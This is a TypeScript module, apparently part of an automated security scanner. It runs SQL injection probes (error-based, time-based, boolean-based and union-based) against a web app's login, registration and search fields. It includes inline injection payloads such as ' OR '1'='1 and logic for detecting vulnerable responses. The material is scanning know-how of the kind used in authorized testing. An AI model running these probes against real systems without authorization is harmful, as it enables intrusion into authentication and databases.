/**
 * SQL Injection Agent — executes targeted SQL injection attacks using 4 strategies:
 *
 *  1. Error-based   — detect SQL error strings leaked in the response body
 *  2. Time-based    — detect response delay from SLEEP/WAITFOR payloads
 *  3. Boolean-based — compare TRUE-condition vs FALSE-condition responses
 *  4. Union-based   — detect DB data extracted via UNION SELECT
 *
 * All requests are deterministic — AI is NOT used here.
 * Specifically targets login/register field names: email, password, username, etc.
 */

import { httpRequest } from "../utils/httpClient";
import { SQL_PAYLOADS } from "../utils/payloadGenerator";

export type SqlStrategy = "error-based" | "time-based" | "boolean-based" | "union-based";

export interface SqlTask {
  id: string;
  route: string;
  method: string;
  strategy: SqlStrategy;
  targetFields: string[];
  payloads: string[];
}

export interface SqlFinding {
  route: string;
  strategy: SqlStrategy;
  payload: string;
  targetField: string;
  evidence: string;
  severity: "critical" | "high";
  checkType: string;
  curlReplay: string;
}

// SQL error string signatures (DB-agnostic)
const SQL_ERROR_SIGNATURES = [
  "you have an error in your sql syntax",
  "sql syntax",
  "mysql_fetch",
  "pg_query",
  "sqlite3",
  "unclosed quotation mark",
  "quoted string not properly terminated",
  "ora-01756",
  "microsoft ole db",
  "odbc sql server driver",
  "warning: mysql",
  "sqlstate",
  "syntax error at or near",
  "invalid input syntax for",
  "column not found",
  "operand should contain",
  "supplied argument is not a valid mysql",
  "division by zero",
];

// Union-extracted data markers
const UNION_DATA_MARKERS = [
  "user()", "root@", "mysql", "postgres", "sqlite_version",
  "information_schema", "@@version", "database()",
];

const TIME_PAYLOADS = SQL_PAYLOADS.filter((p) =>
  p.toLowerCase().includes("sleep") ||
  p.toLowerCase().includes("waitfor") ||
  p.toLowerCase().includes("benchmark") ||
  p.toLowerCase().includes("pg_sleep")
);

const UNION_PAYLOADS = SQL_PAYLOADS.filter((p) => p.toLowerCase().includes("union"));

const BOOLEAN_PAIRS = [
  { truePayload: "' OR '1'='1", falsePayload: "' OR '1'='2" },
  { truePayload: "' AND 1=1--", falsePayload: "' AND 1=2--" },
  { truePayload: "' OR 1=1#", falsePayload: "' OR 1=2#" },
] as const;

// Fields to inject into for different route types
const AUTH_FIELDS = ["email", "username", "user", "login", "password", "pass"];
const GENERAL_FIELDS = ["query", "search", "q", "id", "input", "name", "value"];

function getTargetFields(route: string): string[] {
  const r = route.toLowerCase();
  if (r.includes("login") || r.includes("register") || r.includes("auth") || r.includes("signup")) {
    return AUTH_FIELDS;
  }
  return GENERAL_FIELDS;
}

function buildBody(targetField: string, payload: string, route: string): Record<string, string> {
  const r = route.toLowerCase();
  const isAuth = r.includes("login") || r.includes("register") || r.includes("auth") || r.includes("signup");

  if (isAuth) {
    return {
      email: targetField === "email" ? payload : "test@test.com",
      username: targetField === "username" ? payload : "testuser",
      password: targetField === "password" ? payload : "testpass123",
      [targetField]: payload,
    };
  }
  return { [targetField]: payload, input: payload };
}

function buildCurl(url: string, method: string, body: Record<string, unknown>): string {
  if (method === "GET") {
    const qs = new URLSearchParams(body as Record<string, string>).toString();
    return `curl -s "${url}?${qs}"`;
  }
  return `curl -s -X POST "${url}" -H "Content-Type: application/json" -d '${JSON.stringify(body)}'`;
}

// ── Strategy 1: Error-based ───────────────────────────────────────────────────
async function runErrorBased(baseUrl: string, route: string, method: string): Promise<SqlFinding[]> {
  const findings: SqlFinding[] = [];
  const url = `${baseUrl}${route}`;
  const fields = getTargetFields(route);

  for (const field of fields) {
    for (const payload of SQL_PAYLOADS) {
      const body = buildBody(field, payload, route);
      const res = method === "GET"
        ? await httpRequest(`${url}?${field}=${encodeURIComponent(payload)}`, { timeoutMs: 8_000 })
        : await httpRequest(url, {
            method, headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body), timeoutMs: 8_000,
          });

      const bodyLow = res.body.toLowerCase();
      for (const sig of SQL_ERROR_SIGNATURES) {
        if (bodyLow.includes(sig)) {
          findings.push({
            route, strategy: "error-based", payload, targetField: field,
            evidence: `SQL error signature "${sig}" found in response`,
            severity: "critical", checkType: "sql-injection-error",
            curlReplay: buildCurl(url, method, body),
          });
          break;
        }
      }

      // HTTP 500 on an injected payload = probable unhandled DB exception
      if (res.status === 500 && !res.error) {
        findings.push({
          route, strategy: "error-based", payload, targetField: field,
          evidence: `Server returned 500 on SQL payload — possible unhandled DB error`,
          severity: "high", checkType: "sql-injection-500",
          curlReplay: buildCurl(url, method, body),
        });
      }
    }
  }
  return findings;
}

// ── Strategy 2: Time-based ────────────────────────────────────────────────────
async function runTimeBased(baseUrl: string, route: string, method: string): Promise<SqlFinding[]> {
  const DELAY_THRESHOLD = 4_500;
  const findings: SqlFinding[] = [];
  const url = `${baseUrl}${route}`;

  for (const payload of TIME_PAYLOADS) {
    const body = buildBody("email", payload, route);
    const res = await httpRequest(url, {
      method, headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body), timeoutMs: 12_000,
    });
    if (res.latency >= DELAY_THRESHOLD) {
      findings.push({
        route, strategy: "time-based", payload, targetField: "email",
        evidence: `Time-based SQLi: response took ${res.latency}ms (threshold ${DELAY_THRESHOLD}ms)`,
        severity: "critical", checkType: "sql-injection-time",
        curlReplay: buildCurl(url, method, body),
      });
    }
  }
  return findings;
}

// ── Strategy 3: Boolean-based ─────────────────────────────────────────────────
async function runBooleanBased(baseUrl: string, route: string, method: string): Promise<SqlFinding[]> {
  const findings: SqlFinding[] = [];
  const url = `${baseUrl}${route}`;

  for (const { truePayload, falsePayload } of BOOLEAN_PAIRS) {
    const trueBody = buildBody("email", truePayload, route);
    const falseBody = buildBody("email", falsePayload, route);

    const [trueRes, falseRes] = await Promise.all([
      httpRequest(url, { method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(trueBody), timeoutMs: 8_000 }),
      httpRequest(url, { method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(falseBody), timeoutMs: 8_000 }),
    ]);

    if (trueRes.status !== falseRes.status &&
        trueRes.status >= 200 && trueRes.status < 300 && falseRes.status >= 400) {
      findings.push({
        route, strategy: "boolean-based", payload: truePayload, targetField: "email",
        evidence: `Boolean SQLi: TRUE condition → ${trueRes.status}, FALSE condition → ${falseRes.status}`,
        severity: "critical", checkType: "sql-injection-boolean",
        curlReplay: buildCurl(url, method, trueBody),
      });
    }

    // Large response size difference also indicates boolean-based SQLi
    const sizeDiff = Math.abs(trueRes.body.length - falseRes.body.length);
    if (sizeDiff > 200 && trueRes.status === falseRes.status) {
      findings.push({
        route, strategy: "boolean-based", payload: truePayload, targetField: "email",
        evidence: `Boolean SQLi: ${sizeDiff} byte size difference between TRUE and FALSE conditions`,
        severity: "high", checkType: "sql-injection-boolean-size",
        curlReplay: buildCurl(url, method, trueBody),
      });
    }
  }
  return findings;
}

// ── Strategy 4: Union-based ───────────────────────────────────────────────────
async function runUnionBased(baseUrl: string, route: string, method: string): Promise<SqlFinding[]> {
  const findings: SqlFinding[] = [];
  const url = `${baseUrl}${route}`;

  for (const payload of UNION_PAYLOADS) {
    const body = buildBody("email", payload, route);
    const res = await httpRequest(url, {
      method, headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body), timeoutMs: 8_000,
    });
    const bodyLow = res.body.toLowerCase();

    for (const marker of UNION_DATA_MARKERS) {
      if (bodyLow.includes(marker.toLowerCase())) {
        findings.push({
          route, strategy: "union-based", payload, targetField: "email",
          evidence: `UNION-based SQLi: DB data marker "${marker}" found in response`,
          severity: "critical", checkType: "sql-injection-union",
          curlReplay: buildCurl(url, method, body),
        });
        break;
      }
    }
  }
  return findings;
}

/** Create SQL injection task definitions for a list of routes. */
export function createSqlTasks(routes: Array<{ path: string; methods: string[] }>): SqlTask[] {
  const strategies: SqlStrategy[] = ["error-based", "time-based", "boolean-based", "union-based"];
  return routes.flatMap((route) => {
    const method = route.methods.includes("POST") ? "POST" : route.methods[0] ?? "GET";
    return strategies.map((strategy) => ({
      id: `sql-${strategy}-${route.path.replace(/\//g, "-")}`,
      route: route.path,
      method,
      strategy,
      targetFields: getTargetFields(route.path),
      payloads: strategy === "time-based" ? TIME_PAYLOADS : strategy === "union-based" ? UNION_PAYLOADS : SQL_PAYLOADS,
    }));
  });
}

/** Execute all SQL injection strategies against a single route. */
export async function runSqlInjection(
  baseUrl: string,
  route: { path: string; methods: string[] }
): Promise<SqlFinding[]> {
  const method = route.methods.includes("POST") ? "POST" : "GET";
  const [errorFs, timeFs, boolFs, unionFs] = await Promise.all([
    runErrorBased(baseUrl, route.path, method),
    runTimeBased(baseUrl, route.path, method),
    runBooleanBased(baseUrl, route.path, method),
    runUnionBased(baseUrl, route.path, method),
  ]);
  return [...errorFs, ...timeFs, ...boolFs, ...unionFs];
}
